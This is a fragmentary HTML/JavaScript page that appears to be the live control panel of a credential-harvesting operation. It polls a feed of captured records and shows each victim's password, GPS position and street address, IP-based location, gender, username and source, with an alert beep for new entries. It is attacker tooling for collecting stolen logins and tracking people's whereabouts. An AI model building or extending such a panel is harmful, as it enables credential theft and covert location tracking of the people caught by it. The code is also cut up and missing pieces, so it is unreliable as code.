    <span class="dot"></span>
    <b id="status">Watching live...</b>

  </div>
  <div id="feed"></div>

    const $ = s => document.getElementById(s);

      }
      return out;
    }

    const SKIP = new Set(['id', 'sid', 'rev', 'uid', 'src', 'url', 'password', 'ip', 'time', 'created', 'updated', 'hits', 'gender', 'genderAt']);

    const mapLink = (lat, lon, label) =>
      '<a href="https://www.google.com/maps?q=' + lat + ',' + lon + '" target="_blank" rel="noopener">' + esc(label) + '</a>';

          (c.geoAcc ? ' <i>±' + esc(c.geoAcc) + 'm</i>' : '') + '</span>');
        if (c.addrGps) {
          out.push('<span class="pin gps"><i>' + esc(c.addrGps) +
            (c.addrPostcodeGps ? ' · ' + esc(c.addrPostcodeGps) : '') + '</i></span>');
        }
      }
      if (c.ipLat != null && c.ipLon != null) {
        out.push('<span class="pin ip">◎ IP ' + mapLink(c.ipLat, c.ipLon,
          Number(c.ipLat).toFixed(4) + ', ' + Number(c.ipLon).toFixed(4)) +
          (c.ipCity ? ' <i>' + esc(c.ipCity) + (c.ipRegion ? ', ' + esc(c.ipRegion) : '') + '</i>' : '') + '</span>');
      } else if (edge) {

      const rows = Object.entries(f).filter(([k]) => !SKIP.has(k))
        .map(([k, v]) => '<div><span>' + esc(k) + '</span><span>' + esc(String(v).slice(0, 400)) + '</span></div>').join('');

      const gk = { Male: '', Female: ' f', Other: ' o', skipped: ' s', timeout: ' s' }[c.gender];
      const gb = c.gender ? '<span class="gbadge' + (gk == null ? ' s' : gk) + '">' + esc(c.gender) + '</span>' : '';

      return '<div class="pass' + (p ? '' : ' empty') + '">' + (p ? esc(p) : '· · · no password yet · · ·') + '</div>' +
        locLine(c) +
        '<div class="meta"><b>' + esc(c.uid) + '</b>' + gb + ' via ' + esc(c.src) + (c.username ? ' · ' + esc(c.username) : '') + '<br>' +

        esc(when) + '</div>' +
        '<details><summary>' + Object.keys(f).length + ' fields</summary><div class="dump">' + rows + '</div></details>' +
        '<button class="cp" data-copy="' + c.id + '">copy JSON</button>';
    }

    function upsert(c) {
      const s = JSON.stringify(c);
      if (sig.get(c.id) === s) return;

    }

      try {
        const r = await fetch('/api/feed?since=' + since);
        const d = await r.json();
        $('status').textContent = 'Watching live...';
        $('total').textContent = d.total;
        since = d.latest;
        (d.items || []).forEach(upsert);
      } catch (e) {
        $('status').textContent = 'Reconnecting...';
      }
    }

    function beep() {
      try {
        const a = new (window.AudioContext || window.webkitAudioContext)();
        const o = a.createOscillator(), g = a.createGain();
        o.connect(g); g.connect(a.destination);
        o.frequency.value = 880;
        o.start(); o.stop(a.currentTime + 0.15);
      } catch (e) { }
    }

    feed.addEventListener('click', e => {
      const b = e.target.closest('[data-copy]');
      if (!b) return;
      const rec = cache.get(Number(b.dataset.copy));
      if (!rec) return;
      navigator.clipboard.writeText(JSON.stringify(rec, null, 2));
      b.textContent = 'copied';
      setTimeout(() => b.textContent = 'copy JSON', 1200);
    });

    $('clr').addEventListener('click', async () => {
      await fetch('/api/clear', { method: 'POST' });
      location.reload();
    });

    poll();
    setInterval(poll, 1500);
  </script>
